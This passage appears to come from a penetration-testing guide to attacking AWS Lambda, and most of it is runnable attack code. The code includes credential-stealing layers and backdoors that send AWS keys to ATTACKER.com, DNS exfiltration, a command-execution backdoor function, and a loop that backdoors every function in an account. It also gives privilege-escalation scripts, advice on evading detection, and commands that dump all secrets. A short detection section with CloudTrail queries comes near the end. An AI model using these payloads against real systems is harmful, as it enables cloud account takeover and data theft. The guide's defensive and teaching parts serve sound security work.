# http://127.0.0.1:9001/2018-06-01/runtime/invocation/{id}/response

# Post error for invocation
# http://127.0.0.1:9001/2018-06-01/runtime/invocation/{id}/error

# Init error
# http://127.0.0.1:9001/2018-06-01/runtime/init/error

# Via SSRF — intercept the next invocation's event data
curl "https://API.../prod/ssrf?url=http://127.0.0.1:9001/2018-06-01/runtime/invocation/next"
# This returns the raw event payload — may contain other users' data!
```

### Dependency Confusion / Supply Chain Attacks

```bash [Dependency Attacks]
# 1. Identify dependencies from downloaded code
cat ./function-code/requirements.txt    # Python
cat ./function-code/package.json        # Node.js
cat ./function-code/pom.xml             # Java

# 2. Check if any packages are internal/private
# Look for packages that don't exist on public PyPI/npm

# 3. Dependency confusion: Register the package name on public registry
# with a higher version number containing malicious code

# 4. Layer poisoning: If you have lambda:PublishLayerVersion
# Create a malicious layer that replaces a dependency

# Example: Malicious Python layer
mkdir -p python/lib/python3.9/site-packages/
cat > python/lib/python3.9/site-packages/requests/__init__.py << 'EOF'
# Backdoored requests library
import os, urllib.request

# Exfiltrate credentials on import
creds = f"{os.environ.get('AWS_ACCESS_KEY_ID')}:{os.environ.get('AWS_SECRET_ACCESS_KEY')}:{os.environ.get('AWS_SESSION_TOKEN')}"
urllib.request.urlopen(f"https://ATTACKER.com/steal?c={creds}")

# Import the real requests
from _requests import *
EOF

zip -r malicious-layer.zip python/

aws lambda publish-layer-version \
  --layer-name "python-requests" \
  --zip-file fileb://malicious-layer.zip \
  --compatible-runtimes python3.9
```

---

## Privilege Escalation

### Lambda-Based Privilege Escalation Paths

::note
Lambda is one of the most common **privilege escalation vectors** in AWS because it involves `iam:PassRole` — allowing you to give a function ANY role it can then use.
::

::accordion

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 1: lambda:CreateFunction + iam:PassRole"
  ---
  Create a new Lambda function with an admin execution role. The function runs your code with admin privileges.

  **Required Permissions:** `lambda:CreateFunction`, `iam:PassRole`, `lambda:InvokeFunction`

  ```bash [Exploit]
  # Create malicious function code
  cat > /tmp/privesc.py << 'PYEOF'
  import boto3
  import json

  def handler(event, context):
      iam = boto3.client('iam')
      
      # Option 1: Attach admin policy to your user
      iam.attach_user_policy(
          UserName='compromised-user',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
      )
      
      # Option 2: Create new access keys for admin user
      # keys = iam.create_access_key(UserName='admin-user')
      
      # Option 3: Create backdoor user
      # iam.create_user(UserName='backdoor')
      # keys = iam.create_access_key(UserName='backdoor')
      # iam.attach_user_policy(
      #     UserName='backdoor',
      #     PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
      # )
      
      return {'statusCode': 200, 'body': json.dumps('Escalated!')}
  PYEOF

  cd /tmp && zip privesc.zip privesc.py

  # Create function with admin role
  aws lambda create-function \
    --function-name privesc-func \
    --runtime python3.9 \
    --role arn:aws:iam::123456789012:role/AdminRole \
    --handler privesc.handler \
    --zip-file fileb://privesc.zip

  # Invoke the function
  aws lambda invoke \
    --function-name privesc-func \
    /tmp/output.json

  cat /tmp/output.json
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 2: lambda:UpdateFunctionCode"
  ---
  Modify an existing function's code to abuse its existing (hopefully privileged) execution role.

  **Required Permission:** `lambda:UpdateFunctionCode`

  ```bash [Exploit]
  # Check what role the existing function uses
  aws lambda get-function-configuration \
    --function-name existing-admin-function \
    --query 'Role'

  # Create backdoor code
  cat > /tmp/backdoor.py << 'PYEOF'
  import boto3
  import json

  def handler(event, context):
      # Exfiltrate the execution role credentials
      import os
      creds = {
          'AccessKeyId': os.environ['AWS_ACCESS_KEY_ID'],
          'SecretAccessKey': os.environ['AWS_SECRET_ACCESS_KEY'],
          'SessionToken': os.environ['AWS_SESSION_TOKEN']
      }
      
      # Send to attacker (or just return them)
      return {
          'statusCode': 200,
          'body': json.dumps(creds)
      }
  PYEOF

  cd /tmp && zip backdoor.zip backdoor.py

  # Update the function code
  aws lambda update-function-code \
    --function-name existing-admin-function \
    --zip-file fileb://backdoor.zip

  # Invoke and steal credentials
  aws lambda invoke \
    --function-name existing-admin-function \
    /tmp/stolen-creds.json

  cat /tmp/stolen-creds.json
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 3: lambda:UpdateFunctionConfiguration"
  ---
  Modify function configuration to change the execution role to a more privileged one, or inject environment variables.

  **Required Permissions:** `lambda:UpdateFunctionConfiguration`, `iam:PassRole`

  ```bash [Exploit]
  # Change the function's execution role to admin role
  aws lambda update-function-configuration \
    --function-name target-function \
    --role arn:aws:iam::123456789012:role/AdminRole

  # Or inject malicious environment variable
  # (e.g., LD_PRELOAD for shared library injection)
  aws lambda update-function-configuration \
    --function-name target-function \
    --environment '{"Variables":{"LD_PRELOAD":"/tmp/malicious.so"}}'

  # Or change the handler to a different function
  aws lambda update-function-configuration \
    --function-name target-function \
    --handler malicious.handler

  # Then invoke the function with its new (admin) role
  aws lambda invoke \
    --function-name target-function \
    /tmp/output.json
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 4: lambda:AddPermission — Resource Policy Abuse"
  ---
  Add a resource policy allowing an external account to invoke the function.

  **Required Permission:** `lambda:AddPermission`

  ```bash [Exploit]
  # Allow your external account to invoke the function
  aws lambda add-permission \
    --function-name admin-function \
    --statement-id external-access \
    --action lambda:InvokeFunction \
    --principal arn:aws:iam::ATTACKER_ACCOUNT:root

  # Or allow anyone to invoke it (dangerous!)
  aws lambda add-permission \
    --function-name admin-function \
    --statement-id public-access \
    --action lambda:InvokeFunction \
    --principal '*'

  # From attacker account, invoke the function
  aws lambda invoke \
    --function-name arn:aws:lambda:us-east-1:TARGET_ACCOUNT:function:admin-function \
    /tmp/output.json
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 5: lambda:AddLayerVersionPermission + Layer Injection"
  ---
  Create a malicious layer and attach it to a function to intercept execution.

  **Required Permissions:** `lambda:PublishLayerVersion`, `lambda:UpdateFunctionConfiguration`

  ```bash [Exploit]
  # Create a malicious layer that executes on import
  mkdir -p /tmp/layer/python

  cat > /tmp/layer/python/preload.py << 'PYEOF'
  import os
  import urllib.request
  import json

  # Auto-execute on import: steal credentials
  creds = json.dumps({
      'key': os.environ.get('AWS_ACCESS_KEY_ID'),
      'secret': os.environ.get('AWS_SECRET_ACCESS_KEY'),
      'token': os.environ.get('AWS_SESSION_TOKEN'),
      'function': os.environ.get('AWS_LAMBDA_FUNCTION_NAME')
  })

  try:
      req = urllib.request.Request(
          'https://ATTACKER.com/collect',
          data=creds.encode(),
          headers={'Content-Type': 'application/json'}
      )
      urllib.request.urlopen(req, timeout=3)
  except:
      pass
  PYEOF

  cd /tmp/layer && zip -r ../malicious-layer.zip .

  # Publish the layer
  LAYER_ARN=$(aws lambda publish-layer-version \
    --layer-name "monitoring-utils" \
    --zip-file fileb:///tmp/malicious-layer.zip \
    --compatible-runtimes python3.9 \
    --query 'LayerVersionArn' --output text)

  # Attach to target function
  CURRENT_LAYERS=$(aws lambda get-function-configuration \
    --function-name target-function \
    --query 'Layers[*].Arn' --output text)

  aws lambda update-function-configuration \
    --function-name target-function \
    --layers $CURRENT_LAYERS $LAYER_ARN

  # Modify handler to import our module first
  aws lambda update-function-configuration \
    --function-name target-function \
    --environment '{"Variables":{"PYTHONPATH":"/opt/python"}}'
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 6: lambda:CreateEventSourceMapping"
  ---
  Create a trigger that automatically invokes a function when new data arrives in SQS, DynamoDB, etc.

  **Required Permission:** `lambda:CreateEventSourceMapping`

  ```bash [Exploit]
  # Map a DynamoDB stream to your malicious function
  aws lambda create-event-source-mapping \
    --function-name exfiltration-function \
    --event-source-arn arn:aws:dynamodb:us-east-1:123456789012:table/users/stream/2024-01-01T00:00:00.000 \
    --starting-position LATEST \
    --batch-size 100

  # Map an SQS queue to your function
  aws lambda create-event-source-mapping \
    --function-name exfiltration-function \
    --event-source-arn arn:aws:sqs:us-east-1:123456789012:payment-queue \
    --batch-size 10
  ```
  :::

::

### Privilege Escalation Decision Tree

```
Do you have lambda:CreateFunction + iam:PassRole?
├── YES → Create function with admin role → Invoke → ADMIN
│
├── NO → Do you have lambda:UpdateFunctionCode?
│         ├── YES → Find function with privileged role
│         │         → Replace code → Invoke → Steal creds
│         │
│         ├── NO → Do you have lambda:UpdateFunctionConfiguration + iam:PassRole?
│         │         ├── YES → Change function's role to admin
│         │         │         → Invoke existing code with new role
│         │         │
│         │         ├── NO → Do you have lambda:AddPermission?
│         │         │         ├── YES → Grant yourself invoke access
│         │         │         │         to privileged function
│         │         │         │
│         │         │         ├── NO → Do you have lambda:PublishLayerVersion?
│         │         │         │         ├── YES → Poison layer
│         │         │         │         │         → Wait for invocation
│         │         │         │         │
│         │         │         │         └── NO → Check other services
│         │         │         │                   (EC2, CloudFormation, etc.)
│         │         │         └──
│         │         └──
│         └──
└──
```

---

## Persistence & Evasion

### Backdoor Techniques

::tabs
  :::tabs-item{icon="i-lucide-door-open" label="Backdoor Function"}
  ```python [Persistent Backdoor Lambda]
  # backdoor.py — Multipurpose backdoor function
  import boto3
  import json
  import subprocess
  import os

  def handler(event, context):
      """
      Backdoor Lambda function
      Invoke with different commands via the event payload
      """
      action = event.get('action', 'info')
      
      if action == 'info':
          return {
              'function': os.environ.get('AWS_LAMBDA_FUNCTION_NAME'),
              'region': os.environ.get('AWS_REGION'),
              'role': context.invoked_function_arn,
              'access_key': os.environ.get('AWS_ACCESS_KEY_ID'),
              'secret_key': os.environ.get('AWS_SECRET_ACCESS_KEY'),
              'token': os.environ.get('AWS_SESSION_TOKEN')
          }
      
      elif action == 'exec':
          cmd = event.get('cmd', 'id')
          result = subprocess.run(
              cmd, shell=True, capture_output=True, text=True
          )
          return {'stdout': result.stdout, 'stderr': result.stderr}
      
      elif action == 'aws':
          # Execute arbitrary AWS API calls
          service = event.get('service', 'sts')
          method = event.get('method', 'get_caller_identity')
          params = event.get('params', {})
          
          client = boto3.client(service)
          result = getattr(client, method)(**params)
          return json.loads(json.dumps(result, default=str))
      
      elif action == 'exfil':
          # Exfiltrate data to external endpoint
          import urllib.request
          data = json.dumps(event.get('data', {})).encode()
          req = urllib.request.Request(
              event.get('url', 'https://ATTACKER.com/collect'),
              data=data,
              headers={'Content-Type': 'application/json'}
          )
          urllib.request.urlopen(req)
          return {'status': 'sent'}
  ```

  ```bash [Deploy Backdoor]
  # Package and deploy
  cd /tmp && zip backdoor.zip backdoor.py

  aws lambda create-function \
    --function-name CloudWatchMetricsCollector \
    --runtime python3.9 \
    --role arn:aws:iam::123456789012:role/LambdaAdminRole \
    --handler backdoor.handler \
    --zip-file fileb://backdoor.zip \
    --timeout 300 \
    --memory-size 512 \
    --description "Collects CloudWatch metrics for monitoring dashboard"

  # Usage examples:
  
  # Get credentials
  aws lambda invoke --function-name CloudWatchMetricsCollector \
    --payload '{"action":"info"}' /tmp/creds.json

  # Execute commands
  aws lambda invoke --function-name CloudWatchMetricsCollector \
    --payload '{"action":"exec","cmd":"cat /etc/passwd"}' /tmp/cmd.json

  # Make AWS API calls
  aws lambda invoke --function-name CloudWatchMetricsCollector \
    --payload '{"action":"aws","service":"s3","method":"list_buckets","params":{}}' /tmp/s3.json
  ```
  :::

  :::tabs-item{icon="i-lucide-layers" label="Backdoor Layer"}
  ```bash [Persistent Layer Backdoor]
  # Create a layer that auto-executes on every Lambda cold start
  mkdir -p /tmp/backdoor-layer/extensions

  # Create a Lambda Extension (runs alongside function)
  cat > /tmp/backdoor-layer/extensions/monitoring << 'EXTEOF'
  #!/bin/bash
  # Lambda Extension — runs as a separate process
  # Persists across warm invocations

  # Register with Extensions API
  HEADERS="$(mktemp)"
  curl -sS -LD "$HEADERS" \
    -X POST "http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/register" \
    -H "Lambda-Extension-Name: monitoring" \
    -d '{"events": ["INVOKE", "SHUTDOWN"]}' > /dev/null 2>&1

  EXT_ID=$(grep -i "lambda-extension-identifier" "$HEADERS" | tr -d '[:space:]' | cut -d: -f2)

  # Exfiltrate credentials on first run
  curl -s "https://ATTACKER.com/ext?key=${AWS_ACCESS_KEY_ID}&secret=${AWS_SECRET_ACCESS_KEY}&token=${AWS_SESSION_TOKEN}&func=${AWS_LAMBDA_FUNCTION_NAME}" > /dev/null 2>&1 &

  # Event loop
  while true; do
    curl -sS -X GET "http://${AWS_LAMBDA_RUNTIME_API}/2020-01-01/extension/event/next" \
      -H "Lambda-Extension-Identifier: ${EXT_ID}" > /dev/null 2>&1
  done
  EXTEOF

  chmod +x /tmp/backdoor-layer/extensions/monitoring

  # Package and publish
  cd /tmp/backdoor-layer && zip -r ../monitoring-ext.zip .

  aws lambda publish-layer-version \
    --layer-name "monitoring-extension" \
    --zip-file fileb:///tmp/monitoring-ext.zip \
    --compatible-runtimes python3.9 nodejs18.x

  # Attach to ALL functions
  for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
    echo "[*] Backdooring: $func"
    LAYERS=$(aws lambda get-function-configuration \
      --function-name "$func" \
      --query 'Layers[*].Arn' --output text 2>/dev/null)
    
    aws lambda update-function-configuration \
      --function-name "$func" \
      --layers $LAYERS arn:aws:lambda:us-east-1:123456789012:layer:monitoring-extension:1 \
      2>/dev/null
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-clock" label="Scheduled Trigger"}
  ```bash [Persistent Scheduled Invocation]
  # Create EventBridge (CloudWatch Events) rule for scheduled execution
  aws events put-rule \
    --name "system-health-check" \
    --schedule-expression "rate(6 hours)" \
    --description "Periodic system health check" \
    --state ENABLED

  # Set the backdoor function as target
  aws events put-targets \
    --rule "system-health-check" \
    --targets '[{
      "Id": "health-check-target",
      "Arn": "arn:aws:lambda:us-east-1:123456789012:function:CloudWatchMetricsCollector",
      "Input": "{\"action\":\"info\"}"
    }]'

  # Grant EventBridge permission to invoke
  aws lambda add-permission \
    --function-name CloudWatchMetricsCollector \
    --statement-id events-invoke \
    --action lambda:InvokeFunction \
    --principal events.amazonaws.com \
    --source-arn arn:aws:events:us-east-1:123456789012:rule/system-health-check
  ```
  :::
::

### Evasion Techniques

::accordion

  :::accordion-item
  ---
  icon: i-lucide-eye-off
  label: "Evasion 1: Naming Conventions"
  ---
  Name backdoor resources to blend in with legitimate infrastructure.

  ```bash [Legitimate-Looking Names]
  # Good backdoor names:
  aws lambda create-function --function-name "CloudWatch-LogsProcessor" ...
  aws lambda create-function --function-name "AWS-Config-Remediation" ...
  aws lambda create-function --function-name "SecurityHub-AutoRemediate" ...
  aws lambda create-function --function-name "S3-ReplicationMonitor" ...
  aws lambda create-function --function-name "RDS-SnapshotManager" ...

  # Good layer names:
  aws lambda publish-layer-version --layer-name "aws-monitoring-utils" ...
  aws lambda publish-layer-version --layer-name "common-logging-layer" ...

  # Good rule names:
  aws events put-rule --name "infrastructure-health-check" ...
  aws events put-rule --name "compliance-audit-daily" ...
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-eye-off
  label: "Evasion 2: CloudTrail Blind Spots"
  ---
  ```bash [CloudTrail Considerations]
  # Lambda INVOCATIONS are NOT logged in CloudTrail by default!
  # Only management events are logged:
  # - CreateFunction
  # - UpdateFunctionCode
  # - UpdateFunctionConfiguration
  # - DeleteFunction
  # - AddPermission
  # - CreateEventSourceMapping

  # Lambda data events (invocations) require explicit CloudTrail config
  # Check if data events are enabled:
  aws cloudtrail get-trail-status --name default
  aws cloudtrail get-event-selectors --trail-name default

  # If data events are NOT configured for Lambda,
  # your function INVOCATIONS are invisible!

  # Strategy: Create function once (logged), then invoke freely (not logged)

  # To minimize CreateFunction logs:
  # 1. Update existing function code instead of creating new ones
  # 2. Use existing functions' roles via UpdateFunctionConfiguration
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-eye-off
  label: "Evasion 3: Warm Container Persistence"
  ---
  ```python [Container Reuse Abuse]
  import os
  import json

  # Global scope — persists across warm invocations
  FIRST_RUN = True
  EXFILTRATED = False

  def handler(event, context):
      global FIRST_RUN, EXFILTRATED
      
      if FIRST_RUN and not EXFILTRATED:
          # Only exfiltrate on first invocation per container
          # Reduces detection surface
          import urllib.request
          
          creds = json.dumps({
              'key': os.environ.get('AWS_ACCESS_KEY_ID'),
              'secret': os.environ.get('AWS_SECRET_ACCESS_KEY'),
              'token': os.environ.get('AWS_SESSION_TOKEN')
          }).encode()
          
          try:
              req = urllib.request.Request(
                  'https://ATTACKER.com/collect',
                  data=creds,
                  headers={'Content-Type': 'application/json'}
              )
              urllib.request.urlopen(req, timeout=2)
              EXFILTRATED = True
          except:
              pass
          
          FIRST_RUN = False
      
      # Also: /tmp persists across warm invocations
      # Write data to /tmp, read it on next invocation
      if os.path.exists('/tmp/stolen_data.json'):
          with open('/tmp/stolen_data.json', 'r') as f:
              previous_data = json.load(f)
      
      # Process legitimate request normally
      return {'statusCode': 200, 'body': 'OK'}
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-eye-off
  label: "Evasion 4: DNS-Based Exfiltration"
  ---
  ```python [DNS Exfiltration from Lambda]
  import socket
  import base64
  import os

  def exfil_dns(data, domain="attacker.com"):
      """Exfiltrate data via DNS queries — bypasses most WAFs"""
      encoded = base64.b32encode(data.encode()).decode().rstrip('=')
      
      # Split into 63-char chunks (DNS label limit)
      chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
      
      for i, chunk in enumerate(chunks):
          query = f"{chunk}.{i}.{domain}"
          try:
              socket.gethostbyname(query)
          except:
              pass

  def handler(event, context):
      # Exfiltrate credentials via DNS
      creds = f"{os.environ.get('AWS_ACCESS_KEY_ID')}|{os.environ.get('AWS_SECRET_ACCESS_KEY')}"
      exfil_dns(creds)
      
      return {'statusCode': 200, 'body': 'OK'}
  ```
  :::

::

---

## Data Exfiltration

### Extracting Secrets from Lambda Environment

```bash [Environment Variable Extraction]
# Get ALL environment variables from ALL functions
echo "=== LAMBDA ENVIRONMENT VARIABLE DUMP ==="
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  env_vars=$(aws lambda get-function-configuration \
    --function-name "$func" \
    --query 'Environment.Variables' \
    --output json 2>/dev/null)
  
  if [ "$env_vars" != "null" ] && [ ! -z "$env_vars" ]; then
    echo ""
    echo "[$func]"
    echo "$env_vars" | jq -r 'to_entries[] | "  \(.key) = \(.value)"'
  fi
done

# Search for specific patterns
echo ""
echo "=== SEARCHING FOR SECRETS ==="
for func in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  aws lambda get-function-configuration \
    --function-name "$func" \
    --query 'Environment.Variables' \
    --output json 2>/dev/null | \
  grep -iE "password|secret|key|token|credential|api|auth|jwt|database|connection" && \
  echo "  ^ Found in: $func"
done
```

### Pivoting from Lambda to Connected Services

::tabs
  :::tabs-item{icon="i-lucide-database" label="Database Access"}
  ```python [Lambda → Database Pivot]
  import boto3
  import json
  import os

  def handler(event, context):
      """
      If Lambda has DB credentials in env vars,
      connect and dump data
      """
      
      # RDS / MySQL
      import pymysql
      conn = pymysql.connect(
          host=os.environ['DB_HOST'],
          user=os.environ['DB_USER'],
          password=os.environ['DB_PASS'],
          database=os.environ['DB_NAME']
      )
      cursor = conn.cursor()
      
      # Dump all tables
      cursor.execute("SHOW TABLES")
      tables = cursor.fetchall()
      
      results = {}
      for table in tables:
          table_name = table[0]
          cursor.execute(f"SELECT * FROM {table_name} LIMIT 100")
          results[table_name] = cursor.fetchall()
      
      # DynamoDB (using Lambda's IAM role)
      dynamodb = boto3.client('dynamodb')
      dynamo_tables = dynamodb.list_tables()['TableNames']
      
      for table in dynamo_tables:
          scan = dynamodb.scan(TableName=table, Limit=100)
          results[f"dynamo_{table}"] = scan['Items']
      
      return {
          'statusCode': 200,
          'body': json.dumps(results, default=str)
      }
  ```
  :::

  :::tabs-item{icon="i-lucide-hard-drive" label="S3 Access"}
  ```bash [Lambda Role → S3 Pivot]
  # After stealing Lambda's credentials, enumerate S3 access
  
  # List all buckets
  aws s3 ls
  
  # Find interesting buckets
  aws s3 ls s3://company-backups/
  aws s3 ls s3://production-data/
  aws s3 ls s3://customer-uploads/
  
  # Download sensitive data
  aws s3 sync s3://company-backups/ ./loot/backups/
  aws s3 cp s3://production-data/database-export.sql ./loot/
  
  # Check bucket policies for misconfigs
  aws s3api get-bucket-policy --bucket target-bucket
  aws s3api get-bucket-acl --bucket target-bucket
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="Secrets Manager"}
  ```bash [Lambda Role → Secrets Manager]
  # Lambda roles often have Secrets Manager access
  
  # List all secrets
  aws secretsmanager list-secrets \
    --query 'SecretList[*].[Name,Description]' --output table
  
  # Get secret values
  aws secretsmanager get-secret-value --secret-id prod/database/credentials
  aws secretsmanager get-secret-value --secret-id prod/api/stripe-key
  aws secretsmanager get-secret-value --secret-id prod/auth/jwt-secret
  
  # Dump ALL secrets
  for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
    echo "=== $secret ==="
    aws secretsmanager get-secret-value --secret-id "$secret" \
      --query 'SecretString' --output text 2>/dev/null
    echo ""
  done
  
  # SSM Parameter Store
  aws ssm get-parameters-by-path \
    --path "/" --recursive --with-decryption \
    --query 'Parameters[*].[Name,Value]' --output table
  ```
  :::

  :::tabs-item{icon="i-lucide-network" label="Internal Network"}
  ```bash [VPC Lambda → Internal Network Pivot]
  # If Lambda is in a VPC, you can reach internal services
  
  # Via command injection in a VPC Lambda:
  
  # Network reconnaissance
  curl "https://API.../prod/vuln?cmd=ifconfig"
  curl "https://API.../prod/vuln?cmd=cat+/etc/resolv.conf"
  curl "https://API.../prod/vuln?cmd=nslookup+internal-api.corp.local"
  
  # Port scan internal hosts
  curl "https://API.../prod/vuln?cmd=for+i+in+$(seq+1+1024);do+(echo+>/dev/tcp/10.0.1.50/$i)+2>/dev/null+%26%26+echo+$i+open;done"
  
  # Access internal APIs
  curl "https://API.../prod/vuln?cmd=curl+http://10.0.1.50:8080/api/admin"
  curl "https://API.../prod/vuln?cmd=curl+http://internal-api:3000/users"
  
  # Access internal databases
  curl "https://API.../prod/vuln?cmd=mysql+-h+10.0.1.100+-u+admin+-pPassword123+-e+'SHOW+DATABASES;'"
  
  # Access Redis/ElastiCache
  curl "https://API.../prod/vuln?cmd=redis-cli+-h+10.0.1.200+KEYS+*"
  ```
  :::
::

---

## Defensive Detection

### Key CloudTrail Events to Monitor

| Event Name | Indicator |
|-----------|-----------|
| `CreateFunction` | New function creation — check role and code |
| `UpdateFunctionCode20150331v2` | Function code modification |
| `UpdateFunctionConfiguration20150331v2` | Config change — role, env vars, layers |
| `AddPermission20150331v2` | Resource policy change — external access |
| `PublishLayerVersion20181031` | New layer — potential supply chain attack |
| `CreateEventSourceMapping20150331` | New trigger — data stream access |
| `GetFunction20150331v2` | Code download — recon/exfiltration |
| `Invoke` (data event) | Function execution — requires data event logging |
| `RemovePermission20150331v2` | Policy removal — potential cleanup |
| `DeleteFunction20150331` | Function deletion — evidence destruction |

### Detection Queries

```sql [Athena — Suspicious Lambda Activity]
-- New Lambda functions created with admin roles
SELECT
    eventTime,
    userIdentity.arn AS creator,
    requestParameters.functionName AS func_name,
    requestParameters.role AS execution_role,
    sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'CreateFunction20150331'
AND requestParameters.role LIKE '%Admin%'
ORDER BY eventTime DESC;

-- Lambda code updates (potential backdooring)
SELECT
    eventTime,
    userIdentity.arn AS modifier,
    requestParameters.functionName AS func_name,
    sourceIPAddress,
    userAgent
FROM cloudtrail_logs
WHERE eventName = 'UpdateFunctionCode20150331v2'
ORDER BY eventTime DESC;

-- Lambda functions with public access
SELECT
    eventTime,
    userIdentity.arn AS modifier,
    requestParameters.functionName AS func_name,
    requestParameters.principal AS allowed_principal,
    requestParameters.action AS allowed_action
FROM cloudtrail_logs
WHERE eventName = 'AddPermission20150331v2'
AND requestParameters.principal = '*'
ORDER BY eventTime DESC;

-- Lambda environment variable changes (credential injection)
SELECT
    eventTime,
    userIdentity.arn AS modifier,
    requestParameters.functionName AS func_name,
    sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'UpdateFunctionConfiguration20150331v2'
AND requestParameters.environment IS NOT NULL
ORDER BY eventTime DESC;

-- Source code downloads (reconnaissance)
SELECT
    eventTime,
    userIdentity.arn AS downloader,
    requestParameters.functionName AS func_name,
    sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'GetFunction20150331v2'
ORDER BY eventTime DESC;
```

---

## Tools Arsenal

::card-group

  :::card
  ---
  icon: i-simple-icons-github
  title: Pacu — Lambda Modules
  to: https://github.com/RhinoSecurityLabs/pacu
  target: _blank
  ---
  `lambda__enum` — Enumerate all functions, configs, and roles. `lambda__backdoor_new_roles` — Auto-backdoor new function creation.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: ServerlessGoat
  to: https://github.com/OWASP/Serverless-Goat
  target: _blank
  ---
  OWASP intentionally vulnerable serverless application for learning Lambda exploitation techniques.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: SLS-Dev-Tools
  to: https://github.com/Theodo-UK/sls-dev-tools
  target: _blank
  ---
  Serverless development toolkit with built-in security analysis and function inspection.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: Prowler — Lambda Checks
  to: https://github.com/prowler-cloud/prowler
  target: _blank
  ---
  Automated Lambda security checks including public access, admin roles, VPC config, and environment secrets.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: CloudFox
  to: https://github.com/BishopFox/cloudfox
  target: _blank
  ---
  Find exploitable attack paths in cloud infrastructure including Lambda → IAM → Data paths.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: Lambhack
  to: https://github.com/wickett/lambhack
  target: _blank
  ---
  Vulnerable Lambda function for testing exploitation techniques in a safe environment.
  :::

::

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Lambda Context |
|--------|-----------|---------------|
| **Initial Access** | T1190 — Exploit Public App | Exploit vulnerable API Gateway → Lambda endpoint |
| **Initial Access** | T1078 — Valid Accounts | Stolen Lambda execution role credentials |
| **Execution** | T1059 — Command/Script Interpreter | OS command injection in Lambda function |
| **Execution** | T1648 — Serverless Execution | Deploying malicious Lambda functions |
| **Persistence** | T1098 — Account Manipulation | Modifying Lambda resource policies |
| **Persistence** | T1546 — Event-Triggered Execution | EventBridge rules triggering backdoor functions |
| **Persistence** | T1525 — Implant Container Image | Backdoored Lambda layers or function code |
| **Privilege Escalation** | T1484 — Domain Policy Modification | Modifying IAM policies via Lambda role |
| **Privilege Escalation** | T1548 — Abuse Elevation Control | `iam:PassRole` with Lambda |
| **Defense Evasion** | T1562 — Impair Defenses | Disabling CloudTrail data events |
| **Defense Evasion** | T1070 — Indicator Removal | Deleting functions after use |
| **Credential Access** | T1552 — Unsecured Credentials | Environment variables with plaintext secrets |
| **Credential Access** | T1528 — Steal App Access Token | Extracting STS tokens from Lambda runtime |
| **Discovery** | T1087 — Account Discovery | Enumerating IAM via Lambda role |
| **Lateral Movement** | T1021 — Remote Services | VPC Lambda → internal network services |
| **Collection** | T1530 — Data from Cloud Storage | Lambda role → S3 / DynamoDB access |
| **Exfiltration** | T1567 — Exfil Over Web Service | DNS / HTTPS exfiltration from Lambda |
| **Impact** | T1496 — Resource Hijacking | Crypto mining via Lambda (costly!) |

---

::tip
**Remember**: Lambda invocations are **not logged by default** in CloudTrail. Only management API calls (Create, Update, Delete) are logged. Always verify data event logging status during engagements and recommend enabling it in your report.
::